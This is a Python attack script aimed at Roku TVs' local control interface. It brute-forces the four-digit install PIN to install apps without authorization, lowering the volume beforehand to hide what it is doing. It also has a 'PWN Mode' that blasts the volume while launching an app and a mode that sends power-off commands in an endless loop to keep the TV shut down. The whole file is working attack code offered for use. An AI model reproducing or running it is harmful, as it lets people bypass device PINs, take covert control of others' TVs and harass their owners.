import requests
import time
import subprocess
from tqdm import tqdm

def check_app_installed(ip, app_id):
    response = requests.get(f"http://{ip}:8060/query/apps")
    return f'<app id="{app_id}"' in response.text

def send_keypress(ip, key):
    requests.post(f"http://{ip}:8060/keypress/{key}")
def try_combinations(ip, app_id):
    for i in range(10000):
        combination = f"{i:04}"
        for digit in combination:
            send_keypress(ip, f"Lit_{digit}")
        send_keypress(ip, "Select")
        if check_app_installed(ip, app_id):
            return True
        send_keypress(ip, "Up")
    return False

def install_app(ip, app_id):
    for i in tqdm(range(100), desc="Adjusting Volume"):
        send_keypress(ip, "VolumeDown")
    requests.post(f"http://{ip}:8060/install/{app_id}")
    if try_combinations(ip, app_id):
        print(f"App {app_id} successfully installed.")
        for i in tqdm(range(15), desc="Adjusting Volume"):
            send_keypress(ip, "VolumeUp")
    else:
        print(f"Failed to install app {app_id}.")

def select_option(ip):
    while True:
        option = input("Select an Option: \n1. Install Web Cast\n2. Install Another App\n3. Launch Web Cast\n4. Launch Web Cast (PWN Mode: Be warned!)\n5. Launch Another App\n6. Study Mode\n7. Exit\n")
        if option == '1':
            if check_app_installed(ip, "259656"):
                print("Web Video Caster is already installed")
            else:
                for i in tqdm(range(100), desc="Adjusting Volume"):
                    send_keypress(ip, "VolumeDown")
                requests.post(f"http://{ip}:8060/install/259656")
                if try_combinations(ip, "259656"):
                    print("Web Video Caster successfully installed.")
                    for i in tqdm(range(15), desc="Adjusting Volume"):
                        send_keypress(ip, "VolumeUp")
                else:
                    print("Failed to install Web Video Caster.")
        elif option == '2':
            app_id = input("Enter the app number: ")
            if check_app_installed(ip, app_id):
                print(f"App {app_id} is already installed")
            else:
                install_app(ip, app_id)
        elif option == '3':
            requests.post(f"http://{ip}:8060/launch/259656")
            print("App successfully launched! Please download the Web Video Caster application on your phone to interact with the TV.")
        elif option == '4':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeUp")
            requests.post(f"http://{ip}:8060/launch/259656")
        elif option == '5':
            app_id = input("Enter the app number: ")
            requests.post(f"http://{ip}:8060/launch/{app_id}")
            print("Custom app launched!")
        elif option == '6':
            print("塾モード開始")
            while True:
                try:
                    send_keypress(ip, "PowerOff")
                    time.sleep(1)
                except KeyboardInterrupt:
                    break
        elif option == '7':
            exit()
        else:
            print("Invalid option, please try again.")

ip = input("Enter the IP address of the Roku TV: ")
select_option(ip)
